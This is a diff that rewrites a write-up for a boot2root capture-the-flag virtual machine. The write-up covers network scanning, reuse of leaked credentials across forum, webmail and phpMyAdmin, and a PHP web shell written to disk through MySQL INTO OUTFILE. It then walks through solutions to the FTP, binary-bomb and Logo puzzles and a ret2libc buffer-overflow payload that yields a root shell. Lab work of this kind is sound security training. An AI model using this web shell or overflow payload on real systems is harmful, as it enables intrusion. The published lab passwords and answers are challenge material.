@@ -1,437 +1,327 @@
-# Boot2Root Privilege Escalation Challenge - Writeup
+# Network Reconnaissance
 
-## Step 1: Network Reconnaissance - Finding the Target
+## Discovering the Target
 
-### Discovering the VM's IP Address
+We begin by identifying the IP address of the target VM on the local network.
 
-First, we need to find the IP address of the target virtual machine on our local network.
-
-**Scan the local network:**
 ```bash
 nmap -sn 192.168.1.0/24
 ```
 
-**Output:**
+The scan reveals three active hosts. The unknown host is:
+
 ```
-Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-13 17:23 +01
-Nmap scan report for _gateway (192.168.1.1)
-Host is up (0.0027s latency).
-Nmap scan report for 192.168.1.107
-Host is up (0.00036s latency).
-Nmap scan report for dhcppc8 (192.168.1.108)
-Host is up (0.000085s latency).
-Nmap done: 256 IP addresses (3 hosts up) scanned in 3.34 seconds
+192.168.1.107
 ```
 
-**Target identified:** `192.168.1.107`
+This is identified as the target machine.
 
-### Scanning for Open Ports and Services
+---
 
-Next, we perform a service version scan on the target:
+## Service Enumeration
+
+Next, we enumerate open ports and running services:
 
 ```bash
 nmap -sV 192.168.1.107
 ```
 
-**Output:**
-```
-Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-13 17:24 +01
-Nmap scan report for 192.168.1.107
-Host is up (0.00022s latency).
-Not shown: 994 closed tcp ports (conn-refused)
-PORT    STATE SERVICE    VERSION
-21/tcp  open  ftp        vsftpd 2.0.8 or later
-22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
-80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
-143/tcp open  imap       Dovecot imapd
-443/tcp open  ssl/http   Apache httpd 2.2.22
-993/tcp open  ssl/imaps?
-Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
+Open services:
 
-**Key findings:**
-- FTP service (port 21)
-- SSH service (port 22)
-- HTTP/HTTPS web server (ports 80/443)
-- Email services (IMAP on 143, IMAPS on 993)
+* 21/tcp – FTP (vsftpd)
+* 22/tcp – SSH
+* 80/tcp – HTTP (Apache)
+* 443/tcp – HTTPS
+* 143/993 – IMAP/IMAPS
+
+This indicates a typical web application server with FTP and mail services.
 
 ---
 
-## Step 2: Web Application Enumeration
+# Web Enumeration
 
-### Exploring the Website
+Browsing the web server reveals several interesting directories:
 
-Navigate to `https://192.168.1.107` in a browser. Use directory enumeration tools (like dirbuster or manual exploration) to discover subdirectories:
+* `/forum/`
+* `/phpmyadmin/`
+* `/webmail/`
 
-**Discovered endpoints:**
-- `https://192.168.1.107/forum/`
-- `https://192.168.1.107/phpmyadmin/`
-- `https://192.168.1.107/webmail/`
+These suggest:
 
----
+* A forum application
+* Database administration panel
+* Webmail service
 
-## Step 3: Credential Discovery - Forum
-
-### Finding Credentials in Forum Posts
-
-While browsing the forum at `https://192.168.1.107/forum/`, we discover a post containing connection logs where a user accidentally entered their password in the username field.
-
-**Credentials found:**
-- **Username:** `lmezard`
-- **Password:** `!q\]Ej?*5K5cy*AJ`
-
-### Accessing the Forum Account
-
-Log into the forum using these credentials to gain access to lmezard's account.
-
-**Key finding:** The forum profile reveals an email address associated with this account: `laurie@borntosec.net`
+These will be primary attack vectors.
 
 ---
 
-## Step 4: Email Access - SquirrelMail
+# Initial Credential Discovery (Forum)
 
-### Accessing the Webmail
+While browsing the forum, a user accidentally leaked credentials in a log.
 
-Navigate to `https://192.168.1.107/webmail/` and attempt to log in.
-
-**Hypothesis:** Users often reuse passwords across services.
-
-**Credentials:**
-- **Email:** `laurie@borntosec.net`
-- **Password:** `!q\]Ej?*5K5cy*AJ`
-
-**Result:** Successfully logged into SquirrelMail!
-
-### Finding Database Credentials
-
-In the inbox, we find an important email:
+Discovered credentials:
 
 ```
-Subject: DB Access
-From: qudevide@mail.borntosec.net
-Date: Thu, October 8, 2015 11:25 pm
-To: laurie@borntosec.net
-
-Hey Laurie,
-
-You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
-
-Best regards.
+Username: lmezard
+Password: !q\]Ej?*5K5cy*AJ
 ```
 
-**Database credentials obtained:**
-- **Username:** `root`
-- **Password:** `Fg-'kKXBj87E:aJ$`
+Logging into the forum reveals an associated email:
+
+```
+laurie@borntosec.net
+```
 
 ---
 
-## Step 5: Database Access - phpMyAdmin
+# Email Access (Password Reuse)
 
-### Logging into phpMyAdmin
+Since password reuse is common, we attempt login at:
 
-Navigate to `https://192.168.1.107/phpmyadmin/` and log in with the database credentials.
+```
+https://192.168.1.107/webmail/
+```
 
-**Access level:** Full root database privileges
+Using:
+
+```
+Email: laurie@borntosec.net
+Password: !q\]Ej?*5K5cy*AJ
+```
+
+Login succeeds.
+
+Inside the mailbox, we find database credentials:
+
+```
+Username: root
+Password: Fg-'kKXBj87E:aJ$
+```
 
 ---
 
-## Step 6: Gaining Command Execution - Web Shell Upload
+# Database Access via phpMyAdmin
 
-### Understanding the Attack Vector
+Accessing:
 
-With root database access, we can use MySQL's file writing capabilities to create a PHP web shell that allows us to execute system commands.
+```
+https://192.168.1.107/phpmyadmin/
+```
 
-**Key concepts:**
-- MySQL's `SELECT ... INTO OUTFILE` can write files to disk
-- The database runs as the `www-data` user
-- We need a web-accessible directory that's writable
+We log in as MySQL root.
 
-### Creating the Web Shell
+This grants full database privileges.
 
-**SQL Query executed in phpMyAdmin:**
+---
+
+# Gaining Remote Code Execution
+
+## Why This Works
+
+MySQL supports:
+
+```
+SELECT ... INTO OUTFILE
+```
+
+This allows writing arbitrary files to disk.
+
+Since the database runs as `www-data`, we can write a PHP shell into a web-accessible directory.
+
+---
+
+## Creating the Web Shell
+
 ```sql
-SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/shell.php';
+SELECT "<?php system($_GET['cmd']); ?>" 
+INTO OUTFILE '/var/www/forum/templates_c/shell.php';
 ```
 
-**Why this path?**
-- `/var/www/forum/` is where the forum application lives
-- `templates_c/` is a cache directory used by template engines (like Smarty)
-- Cache directories typically need write permissions for the web server
-
-### Accessing the Web Shell
-
-Navigate to: `https://192.168.1.107/forum/templates_c/shell.php?cmd=whoami`
-
-**Result:** Command execution achieved! The server responds with output from the `whoami` command.
+The directory `templates_c/` is writable because it is used for template caching.
 
 ---
 
-## Step 7: System Enumeration as www-data
+## Verifying Command Execution
 
-### Gathering Information
+Access:
 
-Now that we can execute commands, we enumerate the system:
-
-**Check current user:**
 ```
 https://192.168.1.107/forum/templates_c/shell.php?cmd=whoami
 ```
-Output: `www-data`
 
-**List home directories:**
+Output:
+
 ```
-https://192.168.1.107/forum/templates_c/shell.php?cmd=ls /home
-```
-
-**Discovered users:**
-- lmezard
-- laurie
-- thor
-- zaz
-- (possibly others)
-
-### Finding Credentials
-
-**Search for interesting files:**
-```
-https://192.168.1.107/forum/templates_c/shell.php?cmd=ls -la /home/
+www-data
 ```
 
-**Check for readable files:**
-```
-https://192.168.1.107/forum/templates_c/shell.php?cmd=find /home -type f -readable 2>/dev/null
-```
-
-**Key discovery:** A directory named `LOOKATME` exists
-
-**Read the password file:**
-```
-https://192.168.1.107/forum/templates_c/shell.php?cmd=cat /home/LOOKATME/password
-```
-
-**Output:** `lmezard:G!@M6f4Eatau{sF"`
-
-**New credentials obtained:**
-- **Username:** `lmezard`
-- **Password:** `G!@M6f4Eatau{sF"`
+We now have command execution as `www-data`.
 
 ---
 
-## Step 8: FTP Access - The "fun" File
+# Local Enumeration
 
-### Attempting SSH Access
+From the shell:
 
-First, we try SSH with the new credentials:
-```bash
-ssh lmezard@192.168.1.107
 ```
-**Result:** Authentication failed
+ls /home
+```
 
-### Trying FTP Instead
+Users found:
 
-Since port 21 (FTP) is open, we try those credentials there:
+* lmezard
+* laurie
+* thor
+* zaz
+
+Searching for readable files:
+
+```
+find /home -type f -readable 2>/dev/null
+```
+
+We find:
+
+```
+/home/LOOKATME/password
+```
+
+Contents:
+
+```
+lmezard:G!@M6f4Eatau{sF"
+```
+
+New credentials obtained.
+
+---
+
+# FTP Access (lmezard)
+
+SSH fails with these credentials, but FTP works:
+
 ```bash
 ftp 192.168.1.107
 ```
-**Username:** `lmezard`  
-**Password:** `G!@M6f4Eatau{sF"`
 
-**Result:** Successfully connected!
+Login successful.
 
-### Discovering Files
+Files found:
 
-**FTP commands:**
-```
-ftp> ls
-```
+* README
+* fun
 
-**Files found:**
-- `README`
-- `fun`
-
-**Download the files:**
-```
-ftp> get README
-ftp> get fun
-ftp> quit
-```
+Download both.
 
 ---
 
-## Step 9: The "fun" Puzzle
+# The “fun” Challenge
 
-### Analyzing the File
+The file is a tar archive:
 
-**Check file type:**
 ```bash
 file fun
 ```
-**Output:** `fun: POSIX tar archive (GNU)`
 
-### Extracting the Archive
+Extract:
 
 ```bash
 tar -xvf fun
 ```
 
-**Result:** Hundreds of small files are extracted (PCAP-like files containing code snippets)
+Hundreds of small C fragments appear.
 
-### Understanding the Puzzle
+Each file contains ordering hints referencing other files.
 
-Each file contains a small piece of C code with hints about the ordering. The files need to be assembled in the correct sequence.
+---
 
-### Assembling the Code
+## Reconstructing the Code
 
-**Script to combine files in order:**
-```bash
-grep -l 'file' * \
-| awk -F'file' '\
-  {\
-    cmd = "grep -m1 file \"" $0 "\""\
-    cmd | getline line\
-    close(cmd)\
-    split(line, a, "file")\
-    print a[2] "\t" $0\
-  }\
-' \
-| sort -n \
-| cut -f2- \
-| xargs cat > fun.c
-```
+Using a script to:
 
-This script:
-1. Finds the ordering hints in each file
-2. Sorts them numerically
-3. Concatenates them in order
+* Extract ordering numbers
+* Sort fragments
+* Concatenate properly
 
-### Compiling and Running
+Produces `fun.c`.
 
-**Fix any syntax errors in the code, then compile:**
+Compile:
+
 ```bash
 gcc fun.c -o fun
 ./fun
 ```
 
-**Output:**
+Output:
+
 ```
 MY PASSWORD IS: Iheartpwnage
 Now SHA-256 it and submit
 ```
 
-### Creating the Password Hash
+Hash it:
 
 ```bash
 echo -n "Iheartpwnage" | sha256sum
 ```
 
-**Result:** `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
+Result:
+
+```
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
 
 ---
 
-## Step 10: SSH Access as laurie
+# SSH as laurie
 
-### Determining the User
-
-The password was found in lmezard's FTP, but it's likely for another user. Remember the email address we found earlier: `laurie@borntosec.net`
-
-### Logging in via SSH
+Using the hash as password:
 
 ```bash
 ssh laurie@192.168.1.107
 ```
-**Password:** `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
 
-**Result:** Successfully logged in as `laurie`!
+Login successful.
 
 ---
 
-## Step 11: The Bomb Challenge
+# The Binary Bomb (thor password)
 
-### Discovering the Files
+In laurie’s home directory:
 
-**In laurie's home directory:**
-```bash
-ls -la ~/
+```
+bomb
+README
 ```
 
-**Files found:**
-- `README`
-- `bomb` (executable binary)
+The bomb is a classic reverse engineering challenge with 6 phases.
 
-### Reading the Instructions
+Each phase validates specific input.
 
-```bash
-cat README
+---
+
+## Phase Summary
+
+### Phase 1
+
+String comparison:
+
+```
+Public speaking is very easy.
 ```
 
-```bash
-Diffuse this bomb!
-When you have all the password use it as "thor" user with ssh.
+---
 
-HINT:
-P
- 2
- b
+### Phase 2
 
-o
-4
+Mathematical recurrence:
 
-NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+a[i] = (i+1) * a[i-1]
 ```
 
-The README explains that this is a "binary bomb" - a reverse engineering challenge with 6 phases. Each phase requires specific input, and wrong answers cause the program to "explode."
-
-
-decompiling the binary bomb using BinaryNinja we found 6 phases:
-
-
-## Phase 1
-
-this one does a simple comparison with a fixed string 'Public speaking is very easy.'
-
-## Phase 2
-
-### What the code does
-
-* It reads **six integers** from your input into an array `var_1c[6]` via `read_six_numbers(arg1, &var_1c)`.
-* It immediately checks:
-
-```c
-if (var_1c[0] != 1) explode_bomb();
-```
-
-So the first number **must be 1**.
-
-### The loop constraint
-
-Then it loops `i = 1..5` and computes a `result` intended to reference the previous array element (Binary Ninja produced a weird stack-based expression, but the pattern is standard):
-
-```c
-result = (i + 1) * previous_value;
-if (var_1c[i] != result) explode_bomb();
-```
-
-Interpreted recurrence:
-
-[
-a[i] = (i+1)\cdot a[i-1]
-]
-
-### Deriving the six numbers
-
-Start with:
-
-* `a0 = 1`
-
-Then:
-
-* `a1 = 2 * 1 = 2`
-* `a2 = 3 * 2 = 6`
-* `a3 = 4 * 6 = 24`
-* `a4 = 5 * 24 = 120`
-* `a5 = 6 * 120 = 720`
-
-✅ **Phase 2 input:**
+Solution:
 
 ```
 1 2 6 24 120 720
@@ -439,129 +329,29 @@ Then:
 
 ---
 
-## Phase 3
+### Phase 3
 
-### What the code does
+Switch-case validation.
 
-It parses three values:
-
-```c
-sscanf(arg1, "%d %c %d", &result_1, &var_9, &var_8)
-```
-
-So your input must be:
+Valid example:
 
 ```
-<index> <character> <number>
-```
-
-It requires all 3 items parse successfully (`<=2` explodes).
-
-### Index constraint
-
-```c
-if (result_1 > 7) explode_bomb();
-```
-
-So `index` must be `0..7`.
-
-### Switch table behavior
-
-For each case `0..7`:
-
-* It sets `ebx` to an ASCII value (a character).
-* It checks `var_8` equals a specific constant.
-* After the switch, it checks:
-
-```c
-if (ebx == var_9) return;
-else explode_bomb();
-```
-
-Meaning: **the character you typed must match the case’s expected ASCII char**, and the third integer must match exactly.
-
-### Case mapping (hex → decimal + ASCII)
-
-* Case 0: `ebx=0x71` → `'q'`, and `var_8 == 0x309` → `777`
-* Case 1: `ebx=0x62` → `'b'`, and `var_8 == 0x0d6` → `214`
-* Case 2: `ebx=0x62` → `'b'`, and `var_8 == 0x2f3` → `755`
-* Case 3: `ebx=0x6b` → `'k'`, and `var_8 == 0x0fb` → `251`
-* Case 4: `ebx=0x6f` → `'o'`, and `var_8 == 0x0a0` → `160`
-* Case 5: `ebx=0x74` → `'t'`, and `var_8 == 0x1ca` → `458`
-* Case 6: `ebx=0x76` → `'v'`, and `var_8 == 0x30c` → `780`
-* Case 7: `ebx=0x62` → `'b'`, and `var_8 == 0x20c` → `524`
-
-✅ **Any one of these works:**
-
-```
-0 q 777
 1 b 214
-2 b 755
-3 k 251
-4 o 160
-5 t 458
-6 v 780
-7 b 524
 ```
-
-(For a writeup, it’s fine to pick one, e.g. `3 k 251`.)
 
 ---
 
-## Phase 4
+### Phase 4
 
-### What the code does
+Recursive Fibonacci-style function.
 
-It parses a single integer:
+Target:
 
-```c
-sscanf(arg1, "%d", &var_8) == 1 && var_8 > 0
+```
+func4(x) = 55
 ```
 
-So you must enter **one positive integer**.
-
-Then it computes:
-
-```c
-result = func4(var_8);
-if (result == 0x37) pass; else explode;
-```
-
-So we need:
-[
-func4(x) = 0x37
-]
-And `0x37` in decimal is:
-[
-0x37 = 55
-]
-
-### Understanding func4
-
-```c
-if (arg1 <= 1) return 1;
-return func4(arg1 - 2) + func4(arg1 - 1);
-```
-
-This is Fibonacci-style recursion with:
-
-* `F(0)=1`
-* `F(1)=1`
-
-So:
-
-* `F(2)=2`
-* `F(3)=3`
-* `F(4)=5`
-* `F(5)=8`
-* `F(6)=13`
-* `F(7)=21`
-* `F(8)=34`
-* `F(9)=55`
-
-So `func4(9)=55`.
-
-✅ **Phase 4 input:**
+Solution:
 
 ```
 9
@@ -569,74 +359,13 @@ So `func4(9)=55`.
 
 ---
 
-## Phase 5
+### Phase 5
 
-### What the code does
+Nibble-masked lookup table.
 
-It requires input length exactly 6:
+Transform input → "giants".
 
-```c
-if (string_length(arg1) != 6) explode;
-```
-
-Then for each of the 6 characters:
-
-1. Takes the character byte
-2. Masks low 4 bits (`& 0xF`)
-3. Uses that as an index into a 16-char table:
-
-```c
-array = "isrveawhobpnutfg"
-```
-
-Then it builds a new 6-character string `var_c` and compares it to `"giants"`:
-
-```c
-if (strings_not_equal(var_c, "giants")) explode;
-```
-
-So we need the transformation to produce:
-
-```
-giants
-```
-
-### Table indexing
-
-Index the table (0..15):
-
-```
-0:i 1:s 2:r 3:v 4:e 5:a 6:w 7:h 8:o 9:b 10:p 11:n 12:u 13:t 14:f 15:g
-```
-
-To produce `"giants"`, we need indices:
-
-* `g` → 15
-* `i` → 0
-* `a` → 5
-* `n` → 11
-* `t` → 13
-* `s` → 1
-
-So for each input character `c`:
-[
-(c \ &\ 0xF) = [15, 0, 5, 11, 13, 1]
-]
-
-### Choose any characters with those low nibbles
-
-One clean printable choice:
-
-* low nibble `F` → `'o'` (0x6F)
-* low nibble `0` → `'p'` (0x70)
-* low nibble `5` → `'u'` (0x75)
-* low nibble `B` → `'k'` (0x6B)
-* low nibble `D` → `'m'` (0x6D)
-* low nibble `1` → `'a'` (0x61)
-
-These give indices `[15,0,5,11,13,1]` → `"giants"`.
-
-✅ **Phase 5 input:**
+Valid input:
 
 ```
 opukma
@@ -644,72 +373,13 @@ opukma
 
 ---
 
-## Phase 6
+### Phase 6
 
-### What the code does (high level)
+Linked list reordering.
 
-1. Reads six numbers: `var_1c[6]`.
-2. Validates:
+Nodes must be sorted descending by value.
 
-   * Each number is in `1..6`
-   * All numbers are unique (no duplicates)
-3. Treats each number as a **position** in a linked list starting at `node1`.
-
-   * For each input `k`, it walks `k-1` times via `next` pointer to select the kth node.
-4. Stores those selected nodes into `var_34[6]`.
-5. Relinks them in that exact order (builds a new list).
-6. Checks the new list is sorted **descending** by node value.
-
-### Input validation
-
-```c
-if (var_1c[i] - 1 > 5) explode;   // means var_1c[i] must be 1..6
-if any duplicates explode;
-```
-
-So input must be a permutation of `1 2 3 4 5 6`.
-
-### Node values
-
-we get the node values by decompiling the binary with gdb, running `info variables` to see variables names then running p node1...6 and got these
-
-* node1 (index 1): 253
-* node2 (index 2): 725
-* node3 (index 3): 301
-* node4 (index 4): 997
-* node5 (index 5): 212
-* node6 (index 6): 432
-
-
-### The ordering constraint
-
-This is the critical check:
-
-```c
-result = *esi_6;               // current node value
-if (result < *esi_6[2]) explode_bomb(); // compare to next node value
-```
-
-Interpreting intent: for each adjacent pair:
-[
-value(current) \ge value(next)
-]
-So the new list must be **descending**.
-
-### Sort nodes by value (descending)
-
-Values descending:
-
-1. 997 → node4
-2. 725 → node2
-3. 432 → node6
-4. 301 → node3
-5. 253 → node1
-6. 212 → node5
-
-So the input must specify their indices in that order.
-
-✅ **Phase 6 input:**
+Correct permutation:
 
 ```
 4 2 6 3 1 5
@@ -717,26 +387,172 @@ So the input must specify their indices in that order.
 
 ---
 
-## Final set
+## Final Combined Password (thor)
 
-* **Phase 1:** `Public speaking is very easy.`
-* **Phase 2:** `1 2 6 24 120 720`
-* **Phase 3:** (choice based on the readme hint) `1 b 214`
-* **Phase 4:** `9`
-* **Phase 5:** `opukma`
-* **Phase 6:** `4 2 6 3 1 5`
+Concatenating phase results (no spaces):
 
-so the passowrd for user `thor` is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+```
+Publicspeakingisveryeasy.126241207201b2149opukma426135
+```
 
-------------------
+Login as thor successful.
 
+---
 
-logging to user `thor` we got a readme, which says to finish this challenge and use the result as password for `zaz` user, and a turtle file with some weird instructions and a message saying `Can you digest the message? :)` which suggests hashing whatever we get from the text above.
+# Logo (zaz Password)
 
-doing some research I found out that the turtle file is from the language logo, which is an educational programming language, designed in 1967, and we just have to do some text correction, like `Tourne droite de 90 degrees` should be `RT 90`, so doing that we get the content of the file turtle.logo, and running that in a Logo interperter online[https://turtlecoder.com/] we see it draw the word SLASH, and hashing it we get `646da671ca01bb5d84dbb5fb2238dc8e` which is the `zaz`'s password
+In thor’s directory, a Logo turtle file is found.
 
+After correcting syntax and executing in a Logo interpreter, the drawing spells:
 
-------------------
+```
+SLASH
+```
 
+Hash it:
 
-logging to user `zaz` we find a binary exploit_me 
+```bash
+echo -n "SLASH" | md5sum
+```
+
+Result:
+
+```
+646da671ca01bb5d84dbb5fb2238dc8e
+```
+
+Login as zaz successful.
+
+---
+
+# Final Level – exploit_me (Root)
+
+Binary:
+
+```
+-rwsr-s--- 1 root zaz exploit_me
+```
+
+This is a 32-bit setuid root binary.
+
+---
+
+## Vulnerability
+
+The program:
+
+```c
+char str[128];
+strcpy(str, argv[1]);
+```
+
+No bounds check → stack buffer overflow.
+
+---
+
+## Exploit Strategy: ret2libc
+
+We overwrite the saved return address with `system()`.
+
+### Offset Calculation
+
+Using GDB:
+
+```
+return_address - buffer_start = 140 bytes
+```
+
+---
+
+## Why Fake Return Is Needed
+
+In 32-bit cdecl:
+
+Stack must look like:
+
+```
+[ return address ]
+[ argument ]
+```
+
+So payload must be:
+
+```
+"A"*140
++ system_address
++ fake_return (4 bytes)
++ binsh_address
+```
+
+---
+
+## Finding "/bin/sh"
+
+Using GDB:
+
+```
+find &system,+99999999,"/bin/sh"
+```
+
+This searches inside libc.
+
+---
+
+## Little Endian Detail
+
+Intel is little-endian.
+
+Addresses must be reversed byte-wise:
+
+```
+0xb7e6b060 → "\x60\xb0\xe6\xb7"
+```
+
+Python trick:
+
+```
+[::-1]
+```
+
+Reverses byte string.
+
+---
+
+## Final Payload
+
+```bash
+python -c 'print "A"*140 + "\xb7\xe6\xb0\x60"[::-1] + "AAAA" + "\xb7\xf8\xcc\x58"[::-1]'
+```
+
+Execution:
+
+```
+./exploit_me <payload>
+```
+
+Result:
+
+```
+# whoami
+root
+```
+
+Root shell obtained.
+
+---
+
+# Final Result
+
+Full attack chain:
+
+1. Network enumeration
+2. Forum credential leak
+3. Email access
+4. Database access
+5. Web shell upload
+6. FTP puzzle
+7. SSH lateral movement
+8. Reverse engineering challenge
+9. Logo puzzle
+10. ret2libc exploitation
+11. Root shell
